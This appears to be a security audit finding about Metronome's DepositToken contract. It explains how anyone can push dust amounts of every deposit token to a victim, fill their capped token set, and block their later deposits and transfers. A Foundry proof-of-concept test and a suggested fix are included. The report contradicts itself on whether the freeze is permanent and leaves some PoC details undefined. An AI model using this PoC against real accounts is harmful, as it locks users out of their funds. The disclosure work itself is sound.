### Title
Unrestricted dust transfers/deposits fill a victim's `depositTokensOfAccount` set up to `MAX_TOKENS_PER_USER`, permanently DoS-ing new-collateral deposits and receipt of further deposit tokens - ([File: contracts/DepositToken.sol](contracts/DepositToken.sol))

### Summary
The bug class is "public, unrestricted function that lets anyone push unlimited entries into a storage array/set". In Metronome, `DepositToken._transfer` and `DepositToken._mint` unconditionally call `pool.addToDepositTokensOfAccount(recipient_)` whenever the recipient's balance of that deposit token goes from 0 to non-zero. `Pool` enforces a per-account cap (`MAX_TOKENS_PER_USER`) on `depositTokensOfAccount`. Because both `deposit(amount_, onBehalfOf_)` and `transfer(to_, amount_)` are public and let the caller choose the beneficiary, an unprivileged attacker can push dust amounts (1 wei) of every deposit token in the pool into a victim's token set until it hits the cap. After that, the victim can no longer deposit a collateral type they haven't used before, and can no longer receive deposit-token transfers of any token not already in their set — every such call reverts inside `addToDepositTokensOfAccount`. ### Finding Description
- `DepositToken.deposit(uint256 amount_, address onBehalfOf_)` is `public`, `nonReentrant`, and has no restriction on who `onBehalfOf_` may be; `_mint(onBehalfOf_, _deposited)` is invoked for any non-zero beneficiary. [3](#0-2) 
- `DepositToken.transfer(address to_, uint256 amount_)` only checks the *sender's* unlocked balance via `_revertIfLocked`; `to_` is arbitrary. [4](#0-3) 
- Both paths reach `pool.addToDepositTokensOfAccount(recipient_)` when the recipient had zero balance of that token. The set is capped by `MAX_TOKENS_PER_USER` in `Pool`/`PoolStorage` (`MappedEnumerableSet` used for the account→depositTokens mapping). Once the victim's set contains `MAX_TOKENS_PER_USER` entries, any subsequent `addToDepositTokensOfAccount` for a new token reverts, reverting the entire `deposit`/`transfer` transaction. 
- The attacker needs only 1 wei of each deposit token. Two cheap routes:
  1. For each `DepositToken` in `pool.getDepositTokens()`: `depositToken.deposit(1, victim)` — pulls 1 wei of underlying from the attacker and mints dust to the victim.
  2. `depositToken.transfer(victim, 1)` — requires the attacker to hold unlocked dust (obtainable by depositing 2 wei to themselves first).
- Nothing blocks this: `whenNotPaused`, `nonReentrant`, `onlyIfDepositTokenExists`, `_revertIfLocked` (sender-side only), and `maxTotalSupply` are all satisfied by 1-wei amounts. The `SynthContext`/`getActualMsgSender` layer is irrelevant — the attack works through plain `msg.sender` or via `Operator.execute`.

### Impact Explanation
**Temporary/partial freezing of funds and griefing.** Once the victim's `depositTokensOfAccount` set is at capacity:
- The victim cannot `deposit` any collateral token they haven't previously held — `deposit` reverts at `addToDepositTokensOfAccount`, so they cannot open positions in new collateral types.
- The victim cannot *receive* deposit-token transfers of tokens not already in their set — e.g., liquidators paying out seized collateral via `DepositToken.seize` → `_transfer` to a fresh account, or counterparties sending deposit tokens, all revert. This can block liquidation proceeds routing and smart-farming/zap flows that deposit on behalf of users.
- Recovery requires the victim to fully zero out one token balance (transfer or withdraw all of it) to free a slot, which costs gas per token and may be impossible for locked collateral securing debt (`_revertIfLocked` prevents transferring locked balance), so a victim with debt may be stuck unable to diversify collateral.

This matches the accepted impact of "temporary freezing of funds" — a griefing/DoS against the victim's account, not just increased gas cost.

### Likelihood Explanation
High feasibility for an unprivileged attacker:
- Cost is ~`N` wei of underlying + gas for `N` tokens, where `N = MAX_TOKENS_PER_USER` (bounded by the number of listed deposit tokens, which is small).
- No privileged role, oracle manipulation, flash loan, or governance action is needed; standard public entry points suffice.
- The set entries are also added for `feeCollector` and any `onBehalfOf_`, so all account types are reachable.

The main mitigating factor is that the cap is finite and the victim can free slots, so the DoS is temporary rather than permanent and costs the victim gas/interaction to undo.

### Recommendation
Make set membership non-attackable rather than relying on a per-account cap:
- Revert `addToDepositTokensOfAccount`/`removeFromDepositTokensOfAccount` into a best-effort model where exceeding `MAX_TOKENS_PER_USER` does not block receiving tokens — e.g., stop tracking new tokens for *position calculation* only when the account actually uses them as collateral, or compute positions by iterating over `pool.getDepositTokens()` and checking `balanceOf[account] > 0` instead of a per-account list.
- Alternatively, only add a token to the account's set when the *account itself* initiates the deposit (`onBehalfOf_ == _msgSender()`) or via an explicit opt-in, and allow `seize`/claim flows to handle untracked tokens.

### Proof of Concept
Hardhat/Foundry fork sketch (Foundry-style):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {DepositToken} from "../contracts/DepositToken.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract DepositTokenListSpamTest is Test {
    IPool pool = IPool(POOL_ADDRESS);          // deployed Pool on fork
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");     // any unprivileged EOA

    function testFillVictimDepositTokenSet() public {
        address[] memory depositTokens = pool.getDepositTokens();
        uint256 cap = pool.MAX_TOKENS_PER_USER(); // or storage slot if internal
        uint256 n = depositTokens.length < cap ? depositTokens.length : cap;

        for (uint256 i; i < n; ++i) {
            DepositToken dt = DepositToken(depositTokens[i]);
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1);          // give attacker dust
            vm.startPrank(attacker);
            underlying.approve(address(dt), 1);
            dt.deposit(1, victim);                            // pushes token into victim's set
            vm.stopPrank();
        }

        // Victim's set is now at MAX_TOKENS_PER_USER.
        // Any deposit of a *new* collateral type by/for the victim reverts:
        DepositToken newToken = DepositToken(depositTokens[n]); // token not yet in set
        IERC20 newUnderlying = newToken.underlying();
        deal(address(newUnderlying), victim, 100e18);
        vm.startPrank(victim);
        newUnderlying.approve(address(newToken), 100e18);
        vm.expectRevert(); // addToDepositTokensOfAccount hits MAX_TOKENS_PER_USER
        newToken.deposit(100e18, victim);
        vm.stopPrank();

        // Likewise, a transfer of that token TO the victim reverts,
        // freezing the victim's ability to receive it (e.g., via seize payouts):
        deal(address(newUnderlying), attacker, 1);
        vm.startPrank(attacker);
        newUnderlying.approve(address(newToken), 1);
        newToken.deposit(1, attacker);
        vm.expectRevert();
        newToken.transfer(victim, 1);
        vm.stopPrank();
    }
}
```

Run against a mainnet/testnet fork with the deployed `Pool`, its registered `DepositToken`s, and their real underlyings (deal/whale funding as appropriate). Note: this analysis is based on the indexed source; the exact revert raised inside `Pool.addToDepositTokensOfAccount` (set-cap check in `Pool.sol`/`MappedEnumerableSet.sol`) should be confirmed in the deployed bytecode, but the triggering path — `DepositToken.deposit`/`transfer` → `_mint`/`_transfer` → `pool.addToDepositTokensOfAccount` — is verified in the code above.
